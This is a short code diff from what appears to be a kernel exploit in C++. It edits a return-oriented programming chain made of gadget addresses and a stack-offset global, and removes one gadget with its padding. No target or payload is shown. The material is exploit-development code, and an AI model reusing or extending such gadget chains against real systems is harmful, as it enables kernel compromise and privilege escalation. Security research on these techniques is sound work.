@@ -101,9 +101,6 @@ int main()
     // move rax into rbx to preserve it
     KernelStackManager.AddGadget(0x29cc0e, "push rax; pop rbx; ret;");
     // sets rax to either 'rax + 0x2000' or 'rax + 0x4000' depending on i % 2.
-    // store rax in r10
-    KernelStackManager.AddGadget(0x5453fe, "mov r10, rax; mov rax, r10; add rsp, 0x28; ret;");
-    KernelStackManager.AddPadding(0x28);
     // read the value of the current stack offset global variable
     KernelStackManager.AddGadget(0x202547, "pop rax; ret;");
     KernelStackManager.AddValue((std::uint64_t)CurrentStackOffsetAddress, "current stack offset addr");
